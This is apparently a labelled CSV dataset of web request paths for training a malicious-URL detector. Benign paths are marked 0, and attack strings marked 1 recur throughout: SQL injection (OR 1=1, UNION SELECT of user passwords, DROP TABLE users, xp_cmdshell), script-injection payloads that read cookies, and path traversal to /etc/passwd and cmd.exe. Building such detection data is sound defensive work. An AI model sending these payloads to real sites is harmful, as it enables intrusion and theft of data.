/checkout?id=1199,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?id=1793,0
/checkout?search=onload=prompt(1),1
/login?page=2685,0
/checkout,0
"/UNION SELECT username, password FROM users",1
/about?id=1247,0
"/"" OR 1=1 --",1
/dashboard?page=2526,0
/about,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard,0
/index.html?id=199,0
/products/item?search=?id=1; DROP TABLE users,1
/contact?user=urmit314,0
/api/users?category=tech735,0
/contact?sort=asc194,0
/index.html?id=1358,0
/products/item?user=urmit488,0
/products/item?page=2505,0
/login?category=tech976,0
/onload=prompt(1),1
/about?search=' OR '1'='1,1
/api/users?id=1609,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/login?category=tech532,0
/contact?user=urmit42,0
/checkout?sort=asc306,0
/login,0
/products/item?category=tech75,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?category=tech274,0
/'; EXEC xp_cmdshell('dir');--,1
/login?page=2191,0
/products/item?id=1346,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc798,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech529,0
/login,0
/login,0
/index.html?page=2318,0
/index.html,0
/index.html?id=1981,0
/dashboard?sort=asc659,0
"/"" OR 1=1 --",1
/index.html?sort=asc135,0
/login,0
/checkout?id=1208,0
/dashboard?category=tech388,0
/login?category=tech338,0
/contact?search=admin' --,1
/contact?user=urmit689,0
/contact?category=tech924,0
/about?category=tech668,0
/login?sort=asc37,0
/api/users?sort=asc461,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=1580,0
/about?id=1502,0
/products/item?page=2703,0
/api/users?category=tech426,0
/dashboard,0
/<script>alert(document.cookie)</script>,1
/products/item?page=2184,0
/about?category=tech319,0
/api/users?sort=asc820,0
/checkout?user=urmit104,0
/api/users?category=tech547,0
/index.html,0
/index.html,0
/index.html?user=urmit130,0
/checkout?sort=asc715,0
/index.html?page=2530,0
/contact?page=2276,0
/api/users?user=urmit957,0
/api/users,0
/about,0
/login?page=2425,0
/checkout?user=urmit431,0
/about?user=urmit682,0
/checkout?page=2137,0
/login?category=tech254,0
/dashboard?id=1528,0
/about?sort=asc248,0
/api/users?page=2214,0
/contact?sort=asc896,0
/login?user=urmit206,0
/login?sort=asc35,0
/checkout?page=2188,0
/dashboard?page=2484,0
"/UNION SELECT username, password FROM users",1
/api/users?category=tech34,0
/login?user=urmit401,0
/products/item?sort=asc669,0
/products/item?page=2850,0
/checkout?page=2254,0
/api/users?category=tech769,0
/products/item?search=admin' --,1
/index.html?page=2835,0
"/index.html?search="" OR 1=1 --",1
/?id=1; DROP TABLE users,1
/about,0
/about,0
/contact,0
/about?id=1113,0
/login?sort=asc939,0
/dashboard?category=tech844,0
/contact?page=2419,0
/'; EXEC xp_cmdshell('dir');--,1
/about?id=1880,0
/index.html,0
"/contact?search=UNION SELECT username, password FROM users",1
/login?category=tech145,0
/contact?page=2187,0
/products/item?user=urmit657,0
/contact?user=urmit432,0
/dashboard?id=1623,0
/contact?sort=asc774,0
"/UNION SELECT username, password FROM users",1
/login?id=1417,0
/dashboard?category=tech998,0
/index.html?page=2256,0
/dashboard?category=tech519,0
/products/item,0
/contact?user=urmit185,0
/api/users?id=1660,0
/../../../windows/system32/cmd.exe,1
/contact?sort=asc801,0
/../../../windows/system32/cmd.exe,1
/contact?id=174,0
/contact?category=tech510,0
/dashboard?page=2780,0
/index.html?user=urmit882,0
/checkout?search=admin' --,1
/about?category=tech856,0
/checkout?sort=asc596,0
/api/users?page=2959,0
/products/item?category=tech95,0
/products/item?id=1989,0
/about?category=tech219,0
/login?id=1490,0
/' OR '1'='1,1
/about?page=2551,0
/login?page=2683,0
/login?page=2133,0
/onload=prompt(1),1
/login?search=?id=1; DROP TABLE users,1
/about,0
/' OR '1'='1,1
/about?page=2269,0
/contact,0
/index.html,0
/login?category=tech886,0
/products/item?category=tech721,0
/about?page=2570,0
/about?category=tech244,0
/api/users?page=2351,0
/dashboard?category=tech807,0
/api/users,0
/login?id=1887,0
/products/item?page=2675,0
/contact,0
/index.html?user=urmit379,0
/index.html,0
/contact?page=2968,0
/about?sort=asc388,0
/about,0
"/UNION SELECT username, password FROM users",1
/dashboard,0
/products/item,0
/api/users?page=2705,0
/api/users?id=1396,0
/contact?id=1314,0
/products/item?search=../../../../etc/passwd,1
/about?page=2866,0
/login?id=1342,0
/dashboard?sort=asc270,0
/admin' --,1
/login?page=2640,0
/products/item?sort=asc764,0
/login?page=2145,0
/about?sort=asc156,0
/api/users?category=tech272,0
/contact?id=1324,0
/about?category=tech492,0
/checkout?sort=asc141,0
/dashboard?sort=asc710,0
/about?search=' OR '1'='1,1
/contact?id=1416,0
/api/users?page=2426,0
/products/item?user=urmit955,0
/api/users,0
/login,0
/index.html?page=2912,0
/contact?id=1673,0
/contact?id=1803,0
/contact?id=1449,0
/api/users,0
/products/item?page=219,0
/api/users?search=onload=prompt(1),1
/index.html,0
/dashboard?user=urmit497,0
/products/item?category=tech483,0
/index.html?page=2609,0
"/dashboard?search="" OR 1=1 --",1
"/login?search="" OR 1=1 --",1
/dashboard?sort=asc261,0
/index.html?user=urmit453,0
/about?page=2743,0
/admin' --,1
/' OR '1'='1,1
/onload=prompt(1),1
/products/item?id=1915,0
/index.html?page=2476,0
"/contact?search="" OR 1=1 --",1
/about?search=?id=1; DROP TABLE users,1
/index.html?user=urmit830,0
/checkout?user=urmit401,0
/login,0
/api/users?sort=asc557,0
/index.html?user=urmit487,0
"/"" OR 1=1 --",1
/about?category=tech571,0
/products/item?category=tech726,0
/api/users?sort=asc842,0
/index.html?category=tech251,0
/dashboard?page=2796,0
/checkout?id=1821,0
/about?id=1943,0
/dashboard?sort=asc70,0
/api/users?user=urmit201,0
/contact?sort=asc954,0
/about?user=urmit325,0
/onload=prompt(1),1
/api/users?category=tech847,0
/dashboard?search=' OR '1'='1,1
/checkout?id=1551,0
/about?id=1863,0
/index.html?user=urmit130,0
/products/item?category=tech503,0
/login?user=urmit901,0
/index.html?id=1639,0
"/checkout?search="" OR 1=1 --",1
/products/item?user=urmit598,0
/about?user=urmit52,0
/login?id=1631,0
/contact?category=tech162,0
/products/item?id=1758,0
/index.html?user=urmit30,0
/api/users?sort=asc561,0
/index.html?sort=asc988,0
/checkout?id=1768,0
/api/users?sort=asc528,0
/checkout?id=1295,0
/checkout?id=1402,0
/index.html,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?page=2845,0
/contact,0
/checkout,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?user=urmit146,0
/<script>alert(document.cookie)</script>,1
/api/users?page=2228,0
"/UNION SELECT username, password FROM users",1
/login,0
/api/users?id=1183,0
/login?sort=asc329,0
/login?user=urmit845,0
/../../../../etc/passwd,1
/index.html?id=1388,0
/products/item?id=1225,0
/contact?category=tech804,0
/login?category=tech46,0
/about,0
/about?sort=asc307,0
/index.html?category=tech269,0
/contact,0
/about,0
/dashboard?search=admin' --,1
/api/users?sort=asc489,0
/api/users?id=1664,0
/products/item?user=urmit125,0
/contact?category=tech423,0
/login?category=tech530,0
/contact?id=1493,0
/api/users?user=urmit797,0
"/about?search=UNION SELECT username, password FROM users",1
/login?sort=asc821,0
/products/item,0
/?id=1; DROP TABLE users,1
/contact?page=2803,0
/products/item?page=2630,0
/checkout?sort=asc276,0
/contact?id=1670,0
/api/users?user=urmit541,0
/index.html?user=urmit878,0
/dashboard?category=tech446,0
/api/users?category=tech100,0
/api/users,0
/dashboard?category=tech795,0
/index.html?sort=asc171,0
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?id=1442,0
/login?user=urmit94,0
/checkout?sort=asc874,0
/login?search=admin' --,1
/login?user=urmit29,0
/dashboard?page=276,0
/' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc631,0
/products/item?category=tech152,0
/api/users,0
/products/item?search=<script>alert(document.cookie)</script>,1
/dashboard?page=2905,0
/login?id=1292,0
/api/users?sort=asc57,0
/dashboard?sort=asc732,0
/../../../windows/system32/cmd.exe,1
/checkout?user=urmit59,0
/index.html?user=urmit42,0
/products/item?id=1248,0
/about,0
/contact?page=2652,0
/contact?sort=asc1,0
"/"" OR 1=1 --",1
/index.html,0
/checkout?category=tech836,0
/index.html,0
/checkout?category=tech192,0
/login,0
/products/item?sort=asc742,0
/login?sort=asc251,0
/contact?search=onload=prompt(1),1
/dashboard?category=tech184,0
/contact?sort=asc262,0
/dashboard?page=2350,0
/index.html?page=2339,0
/contact?page=2758,0
/index.html?sort=asc647,0
/api/users?search=admin' --,1
/contact?user=urmit421,0
/onload=prompt(1),1
/dashboard?sort=asc435,0
/products/item?page=2271,0
/about?page=2226,0
/index.html?page=2978,0
/about?search=javascript:eval('var a=1'),1
"/api/users?search="" OR 1=1 --",1
/login?user=urmit55,0
/about?id=1550,0
/contact?sort=asc902,0
/about,0
/products/item?id=1615,0
/about?id=1448,0
/products/item?id=1354,0
/dashboard,0
/api/users?user=urmit791,0
/products/item?category=tech718,0
/contact?page=2712,0
/api/users?id=159,0
/products/item?id=1107,0
/' OR '1'='1,1
/products/item,0
/login?id=1444,0
/login?page=2640,0
/products/item?search=../../../../etc/passwd,1
/dashboard,0
/javascript:eval('var a=1'),1
/checkout?page=2107,0
/login,0
/index.html?category=tech839,0
/javascript:eval('var a=1'),1
/dashboard?user=urmit117,0
/checkout?page=2896,0
/dashboard?search=admin' --,1
/login?user=urmit273,0
/about?search=admin' --,1
/dashboard?id=1489,0
/index.html?search=' OR '1'='1,1
/javascript:eval('var a=1'),1
/checkout?sort=asc415,0
/index.html?id=1795,0
/index.html?user=urmit651,0
/index.html?category=tech254,0
/about?sort=asc615,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?page=2995,0
/about?search=<script>alert(document.cookie)</script>,1
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?sort=asc220,0
/products/item?id=1190,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1902,0
/checkout?sort=asc533,0
/about?sort=asc733,0
/<script>alert(document.cookie)</script>,1
"/UNION SELECT username, password FROM users",1
/login?sort=asc441,0
/checkout?user=urmit261,0
/about?search='; EXEC xp_cmdshell('dir');--,1
/index.html,0
/index.html?page=219,0
/contact?user=urmit965,0
/index.html,0
/products/item?user=urmit905,0
/contact?category=tech896,0
/contact?user=urmit164,0
/' OR '1'='1,1
/dashboard?page=2294,0
/dashboard?id=132,0
/dashboard?page=2486,0
/../../../windows/system32/cmd.exe,1
/contact?sort=asc3,0
/checkout,0
/contact?sort=asc59,0
/checkout?sort=asc850,0
/login?page=2871,0
/about?sort=asc989,0
/checkout?page=2614,0
/checkout?search=<script>alert(document.cookie)</script>,1
/login?category=tech621,0
/login?id=1265,0
/login,0
/' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/products/item?category=tech332,0
/login?id=1582,0
/index.html?page=216,0
/about?category=tech513,0
/products/item?user=urmit952,0
/index.html,0
/api/users?category=tech12,0
/index.html?user=urmit118,0
/checkout?sort=asc507,0
/checkout?category=tech101,0
/products/item?page=2937,0
/login?page=2391,0
/index.html?search=admin' --,1
/<script>alert(document.cookie)</script>,1
/about?id=1166,0
/index.html?category=tech39,0
/api/users?category=tech174,0
/checkout?id=1422,0
/dashboard?user=urmit786,0
/dashboard?user=urmit871,0
/api/users?search=../../../windows/system32/cmd.exe,1
/index.html?sort=asc565,0
/login?category=tech404,0
/products/item,0
/login?page=2308,0
/index.html?page=217,0
/login?search=admin' --,1
/api/users?category=tech178,0
/contact?id=112,0
/api/users,0
/contact?category=tech442,0
/about?sort=asc832,0
/contact?user=urmit508,0
/contact?sort=asc720,0
/contact,0
/checkout?page=2862,0
"/"" OR 1=1 --",1
/checkout?user=urmit794,0
/login?category=tech193,0
/checkout?category=tech462,0
/api/users,0
/api/users?sort=asc491,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users?category=tech849,0
/contact?id=1350,0
/dashboard?sort=asc757,0
/dashboard?user=urmit647,0
/products/item?search=javascript:eval('var a=1'),1
/dashboard?sort=asc672,0
/api/users?page=2647,0
/checkout?user=urmit510,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2653,0
/contact?id=1352,0
/about?page=2680,0
/login,0
/api/users?sort=asc52,0
/about?category=tech482,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/about?page=2661,0
/contact,0
/checkout?user=urmit933,0
/products/item?id=1826,0
/index.html?sort=asc839,0
/contact?category=tech533,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?search=../../../windows/system32/cmd.exe,1
/checkout?sort=asc433,0
/about?sort=asc259,0
/api/users?page=2571,0
/index.html,0
/api/users?sort=asc110,0
/contact?category=tech704,0
/contact?category=tech184,0
/products/item?user=urmit44,0
"/UNION SELECT username, password FROM users",1
/index.html?sort=asc566,0
/products/item?sort=asc252,0
"/index.html?search=UNION SELECT username, password FROM users",1
/index.html?category=tech620,0
/dashboard?page=256,0
/api/users,0
/products/item?page=2992,0
/products/item?category=tech746,0
"/UNION SELECT username, password FROM users",1
/index.html?category=tech575,0
/checkout?category=tech854,0
/login?sort=asc20,0
/login?sort=asc6,0
/../../../windows/system32/cmd.exe,1
/dashboard?category=tech634,0
/?id=1; DROP TABLE users,1
/contact?page=2412,0
/login,0
/api/users?id=1705,0
/index.html,0
/contact?page=2519,0
/about,0
/about?category=tech588,0
/about?user=urmit564,0
/about,0
/checkout,0
/api/users?page=2197,0
/contact?user=urmit168,0
/contact?search=javascript:eval('var a=1'),1
/api/users?page=2550,0
/' OR '1'='1,1
/about?page=2423,0
/products/item?page=2340,0
/login?sort=asc172,0
/login?user=urmit312,0
/products/item?sort=asc233,0
/products/item?category=tech526,0
/dashboard?user=urmit441,0
/login?search=?id=1; DROP TABLE users,1
/login?id=1215,0
/login?user=urmit718,0
/api/users?sort=asc943,0
/dashboard?category=tech210,0
/contact?id=187,0
/contact?category=tech309,0
/dashboard?id=1658,0
/about?category=tech989,0
/dashboard?search=../../../../etc/passwd,1
/index.html?category=tech103,0
/checkout,0
/products/item?page=2901,0
/products/item?search=../../../../etc/passwd,1
"/UNION SELECT username, password FROM users",1
/about?category=tech751,0
/about?id=1737,0
/api/users?user=urmit772,0
/api/users?user=urmit779,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?id=1763,0
/api/users?category=tech43,0
/admin' --,1
/api/users,0
/products/item,0
/login,0
/contact?page=2419,0
/products/item,0
/products/item?page=2460,0
"/products/item?search="" OR 1=1 --",1
/api/users?page=2887,0
/checkout?page=2953,0
/index.html?search=admin' --,1
/<script>alert(document.cookie)</script>,1
/about?id=1817,0
/api/users?id=1421,0
/about?id=1970,0
/api/users?sort=asc777,0
/login?id=1520,0
/login?user=urmit355,0
/checkout?id=1482,0
/<script>alert(document.cookie)</script>,1
/dashboard?page=2245,0
/index.html?category=tech627,0
/products/item?user=urmit590,0
/checkout?sort=asc791,0
/../../../windows/system32/cmd.exe,1
/checkout?category=tech830,0
/login,0
/dashboard?search=admin' --,1
/index.html?category=tech740,0
/login?id=1898,0
/about?category=tech480,0
/api/users,0
/index.html?category=tech359,0
/dashboard,0
/api/users?page=2528,0
/contact?sort=asc141,0
/checkout?page=235,0
/contact?category=tech594,0
/dashboard?page=2192,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech231,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about,0
/about?category=tech63,0
/api/users?user=urmit182,0
/about?search=onload=prompt(1),1
/dashboard?category=tech537,0
/checkout?sort=asc560,0
/contact,0
/checkout?page=2212,0
/index.html?search=<script>alert(document.cookie)</script>,1
/login?page=268,0
/api/users?category=tech395,0
/api/users?user=urmit913,0
/products/item?page=2721,0
/contact?user=urmit979,0
/about?sort=asc474,0
/dashboard?page=2555,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?sort=asc232,0
/dashboard?page=2723,0
/api/users?search=../../../windows/system32/cmd.exe,1
/dashboard?user=urmit463,0
/about?id=1239,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users,0
/index.html,0
/onload=prompt(1),1
/index.html?user=urmit913,0
/contact?sort=asc172,0
/checkout?sort=asc492,0
/products/item?category=tech95,0
/about?page=2470,0
/products/item?sort=asc119,0
/contact?search=?id=1; DROP TABLE users,1
/about?category=tech900,0
/about?page=273,0
/index.html?id=1382,0
/login?sort=asc489,0
/api/users?search=javascript:eval('var a=1'),1
/api/users?category=tech506,0
/products/item?category=tech475,0
/checkout?id=1257,0
/dashboard,0
/index.html?search=<script>alert(document.cookie)</script>,1
/products/item,0
/javascript:eval('var a=1'),1
/login?sort=asc729,0
/index.html?sort=asc248,0
/products/item?id=1165,0
/' OR '1'='1,1
/about?page=2910,0
/dashboard?page=2275,0
"/contact?search="" OR 1=1 --",1
/dashboard?user=urmit867,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?sort=asc960,0
/api/users?sort=asc163,0
/api/users?id=1803,0
/dashboard?sort=asc325,0
/checkout?sort=asc646,0
/api/users?sort=asc616,0
"/products/item?search=UNION SELECT username, password FROM users",1
/products/item?category=tech748,0
/checkout?user=urmit655,0
/api/users,0
/index.html?id=1494,0
/about?search=' OR '1'='1,1
/api/users?id=1384,0
/api/users,0
/checkout?sort=asc844,0
/products/item?sort=asc407,0
/products/item?id=1478,0
/contact?sort=asc699,0
/dashboard?category=tech410,0
/products/item?search=../../../windows/system32/cmd.exe,1
/' OR '1'='1,1
/products/item?id=1114,0
/about?user=urmit371,0
/about?page=230,0
/products/item?search=' OR '1'='1,1
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit780,0
/dashboard,0
/about?category=tech336,0
/checkout?id=182,0
/checkout?user=urmit974,0
/index.html?page=2193,0
/api/users?sort=asc775,0
/' OR '1'='1,1
/checkout,0
"/dashboard?search=UNION SELECT username, password FROM users",1
"/UNION SELECT username, password FROM users",1
/login?user=urmit522,0
/dashboard?user=urmit785,0
/index.html?category=tech564,0
/checkout?user=urmit551,0
/api/users?sort=asc614,0
/about?page=2316,0
/login?id=190,0
/api/users?page=2546,0
/?id=1; DROP TABLE users,1
/about?page=2269,0
/login?category=tech857,0
/products/item?page=2714,0
/login?sort=asc346,0
/api/users?id=1414,0
/login?id=1260,0
/api/users?user=urmit593,0
/?id=1; DROP TABLE users,1
/about?sort=asc747,0
/javascript:eval('var a=1'),1
/index.html?id=1209,0
/dashboard?sort=asc714,0
"/"" OR 1=1 --",1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/about?page=258,0
/login?sort=asc97,0
/dashboard?sort=asc257,0
/products/item?sort=asc737,0
/products/item?user=urmit26,0
/contact?category=tech604,0
/api/users?page=2234,0
/products/item?user=urmit849,0
/about?user=urmit567,0
"/"" OR 1=1 --",1
/dashboard?sort=asc487,0
/about?page=242,0
/login?user=urmit4,0
/login?user=urmit823,0
/dashboard?id=1787,0
/index.html?user=urmit949,0
/contact?page=2484,0
/?id=1; DROP TABLE users,1
/<script>alert(document.cookie)</script>,1
/checkout?category=tech51,0
/contact?sort=asc696,0
/api/users?search=<script>alert(document.cookie)</script>,1
/products/item?sort=asc124,0
/products/item?user=urmit889,0
/contact?category=tech683,0
/index.html?search=../../../../etc/passwd,1
/api/users?category=tech871,0
"/"" OR 1=1 --",1
/dashboard?sort=asc273,0
/contact?search=?id=1; DROP TABLE users,1
/checkout?id=1123,0
/products/item?search=' OR '1'='1,1
/contact?page=2681,0
/about?sort=asc489,0
/checkout?user=urmit804,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?id=1279,0
/products/item?id=1149,0
/checkout?user=urmit160,0
/contact?page=2465,0
/about?page=2451,0
/login?category=tech218,0
/login?id=1945,0
/dashboard,0
/products/item?category=tech146,0
/api/users?category=tech224,0
/contact?search=onload=prompt(1),1
/contact?category=tech90,0
/api/users?user=urmit993,0
/contact?sort=asc486,0
/products/item?page=279,0
/index.html?sort=asc665,0
/api/users?id=1518,0
/checkout?page=2295,0
/products/item?page=2206,0
/products/item?id=1348,0
/onload=prompt(1),1
/checkout,0
/login,0
/dashboard?category=tech507,0
/' OR '1'='1,1
/checkout?category=tech449,0
/index.html?user=urmit589,0
/products/item?page=227,0
/about?search=javascript:eval('var a=1'),1
/dashboard,0
/dashboard?user=urmit451,0
/login,0
/login?user=urmit92,0
/javascript:eval('var a=1'),1
/products/item?id=1994,0
/dashboard?category=tech243,0
/index.html,0
/<script>alert(document.cookie)</script>,1
/products/item?search=' OR '1'='1,1
/api/users?category=tech623,0
/<script>alert(document.cookie)</script>,1
/login,0
/api/users?search=../../../../etc/passwd,1
/index.html?page=2531,0
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?user=urmit795,0
/checkout?page=228,0
/checkout,0
/onload=prompt(1),1
/dashboard?user=urmit760,0
/checkout,0
/about?category=tech954,0
/login,0
/about?page=238,0
/dashboard,0
/index.html?page=2645,0
/?id=1; DROP TABLE users,1
/checkout?user=urmit378,0
/../../../windows/system32/cmd.exe,1
/index.html?id=1975,0
/contact?page=2818,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/UNION SELECT username, password FROM users",1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit567,0
/about?sort=asc810,0
/about?id=1670,0
/about?page=2638,0
/login?page=2872,0
/products/item?category=tech968,0
/about,0
/products/item?user=urmit234,0
/products/item?id=1906,0
/contact?user=urmit24,0
/dashboard,0
/login?sort=asc23,0
/login?category=tech676,0
/api/users,0
/api/users?category=tech884,0
/about?user=urmit226,0
/login?id=1935,0
/contact?page=2907,0
/api/users?sort=asc455,0
/login?page=2790,0
/index.html?search=' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/api/users?category=tech226,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/contact?category=tech466,0
/index.html?user=urmit902,0
/' OR '1'='1,1
/about?id=1682,0
/' OR '1'='1,1
/products/item?sort=asc800,0
/about?id=1341,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech515,0
/index.html?page=2516,0
/checkout?user=urmit133,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/../../../windows/system32/cmd.exe,1
/index.html?page=2602,0
/products/item?search=?id=1; DROP TABLE users,1
/../../../../etc/passwd,1
/../../../../etc/passwd,1
/dashboard?page=2636,0
/contact?id=1411,0
/?id=1; DROP TABLE users,1
/login,0
/contact,0
/checkout?id=1699,0
/products/item?category=tech378,0
/index.html?user=urmit448,0
/api/users?user=urmit417,0
/index.html?category=tech151,0
/api/users?id=1598,0
/index.html?page=260,0
/login?id=1593,0
/index.html?sort=asc463,0
/../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/about?user=urmit183,0
/onload=prompt(1),1
/index.html?sort=asc830,0
/products/item,0
/login?page=2939,0
/dashboard?page=2213,0
/index.html?sort=asc249,0
/index.html?page=2923,0
"/products/item?search=UNION SELECT username, password FROM users",1
/api/users?user=urmit128,0
/contact?user=urmit617,0
/contact,0
/login?page=2973,0
/about?search=../../../windows/system32/cmd.exe,1
/login?search=admin' --,1
/products/item?category=tech773,0
/api/users,0
/contact?search=' OR '1'='1,1
/checkout,0
/login,0
/<script>alert(document.cookie)</script>,1
/index.html?category=tech663,0
/products/item?user=urmit799,0
/contact?user=urmit929,0
/contact,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?page=2633,0
/index.html?page=2475,0
/products/item?user=urmit26,0
/products/item?page=2541,0
/checkout?user=urmit763,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/onload=prompt(1),1
/dashboard?sort=asc874,0
/contact?id=1526,0
/about?page=2472,0
/dashboard?sort=asc53,0
/checkout?user=urmit870,0
/dashboard?id=1835,0
/api/users?category=tech56,0
/login?category=tech566,0
/about?search=../../../../etc/passwd,1
/javascript:eval('var a=1'),1
/index.html?search=' OR '1'='1,1
/index.html?search=?id=1; DROP TABLE users,1
/contact?category=tech367,0
/login?id=1625,0
/about?page=284,0
/about,0
/api/users?page=2768,0
/products/item?user=urmit461,0
/products/item?search=javascript:eval('var a=1'),1
/products/item?category=tech739,0
/products/item?user=urmit176,0
/<script>alert(document.cookie)</script>,1
/login?page=2506,0
/api/users,0
/dashboard,0
/login?sort=asc426,0
/index.html?page=2119,0
/about?search=../../../../etc/passwd,1
/../../../windows/system32/cmd.exe,1
/products/item?user=urmit216,0
/contact?sort=asc225,0
/index.html?sort=asc647,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login,0
/login?search=<script>alert(document.cookie)</script>,1
/index.html?search=onload=prompt(1),1
/index.html,0
/api/users,0
/index.html?user=urmit118,0
/admin' --,1
/dashboard?category=tech623,0
/checkout?category=tech136,0
/about?sort=asc316,0
/login?page=2399,0
/about?category=tech68,0
/about?user=urmit721,0
/api/users?category=tech329,0
/javascript:eval('var a=1'),1
/about?page=2972,0
/dashboard?sort=asc839,0
/products/item?category=tech581,0
/index.html?sort=asc33,0
/index.html?category=tech403,0
/about?page=2976,0
/dashboard?sort=asc111,0
/login?sort=asc739,0
/login,0
/checkout?category=tech116,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?category=tech954,0
/about,0
/dashboard,0
/checkout?user=urmit388,0
/checkout?id=1629,0
/dashboard?sort=asc811,0
/contact?id=1446,0
/login?sort=asc249,0
/contact?user=urmit845,0
/login?sort=asc717,0
/api/users?user=urmit71,0
/checkout?page=2428,0
/products/item?user=urmit116,0
/onload=prompt(1),1
/dashboard?id=1799,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html,0
/contact?sort=asc83,0
/contact,0
/contact?category=tech558,0
/about?user=urmit651,0
/login?category=tech629,0
/dashboard?category=tech416,0
/about?id=1851,0
/checkout?page=2455,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?id=1460,0
/index.html?category=tech789,0
/about?category=tech450,0
/login?sort=asc948,0
/about?sort=asc654,0
/api/users?page=2553,0
/index.html?user=urmit849,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2219,0
/api/users?page=2503,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/dashboard,0
/?id=1; DROP TABLE users,1
/about?search='; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech472,0
/products/item,0
/contact?sort=asc42,0
/contact?category=tech413,0
/login?sort=asc710,0
/login?page=2499,0
/login?user=urmit190,0
/about?sort=asc998,0
/index.html?sort=asc752,0
/dashboard?user=urmit324,0
/products/item?user=urmit483,0
/index.html?user=urmit714,0
/login?page=2803,0
/login?user=urmit334,0
/about?id=1277,0
/login?page=2282,0
/products/item?user=urmit933,0
/about?id=1953,0
/about?user=urmit182,0
/index.html?search=admin' --,1
/checkout?user=urmit981,0
/contact?page=2133,0
/index.html?user=urmit322,0
/checkout?search=?id=1; DROP TABLE users,1
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc328,0
/products/item?category=tech266,0
/checkout?user=urmit175,0
/index.html,0
/index.html?id=1298,0
/checkout?user=urmit695,0
/checkout?category=tech198,0
/products/item?page=2686,0
/checkout,0
/checkout?category=tech226,0
"/index.html?search="" OR 1=1 --",1
/login?sort=asc788,0
/index.html,0
/api/users?sort=asc591,0
/contact?sort=asc677,0
/login?page=2352,0
/api/users?user=urmit374,0
/index.html?category=tech736,0
/dashboard?id=138,0
/contact?sort=asc966,0
/login?page=2327,0
/login?sort=asc168,0
/checkout?id=1885,0
/contact?search=../../../windows/system32/cmd.exe,1
/api/users?id=1975,0
/checkout?page=2463,0
/' OR '1'='1,1
/about?page=2301,0
/login?category=tech84,0
/dashboard?user=urmit797,0
/products/item,0
/contact?search=../../../../etc/passwd,1
/login?user=urmit61,0
/api/users,0
/index.html?category=tech333,0
/checkout?sort=asc165,0
/api/users?sort=asc738,0
/products/item?search=../../../../etc/passwd,1
/products/item?sort=asc682,0
/api/users?page=2738,0
/contact?sort=asc535,0
/api/users?id=1988,0
/contact?sort=asc439,0
/login,0
/javascript:eval('var a=1'),1
/api/users?page=2382,0
/contact?user=urmit494,0
/index.html?user=urmit875,0
/api/users?page=2901,0
/?id=1; DROP TABLE users,1
/index.html?id=1234,0
/login?page=21,0
/login?page=2726,0
/products/item?user=urmit543,0
/dashboard,0
"/UNION SELECT username, password FROM users",1
/products/item?search=../../../../etc/passwd,1
/dashboard,0
/index.html?id=1844,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?id=1277,0
/products/item,0
/login?sort=asc816,0
/contact?user=urmit527,0
/' OR '1'='1,1
/login?search=../../../../etc/passwd,1
/contact?page=295,0
"/"" OR 1=1 --",1
/about?category=tech215,0
/<script>alert(document.cookie)</script>,1
/about?sort=asc374,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?id=1964,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?sort=asc935,0
/login?category=tech618,0
/index.html?page=2567,0
/index.html?id=1818,0
/login?sort=asc594,0
/login?category=tech821,0
/<script>alert(document.cookie)</script>,1
/products/item,0
/about?sort=asc120,0
/contact?id=1220,0
/api/users?id=1301,0
/contact?page=2695,0
/api/users?sort=asc957,0
/login?user=urmit549,0
/dashboard?page=252,0
/checkout?page=2138,0
/dashboard?user=urmit526,0
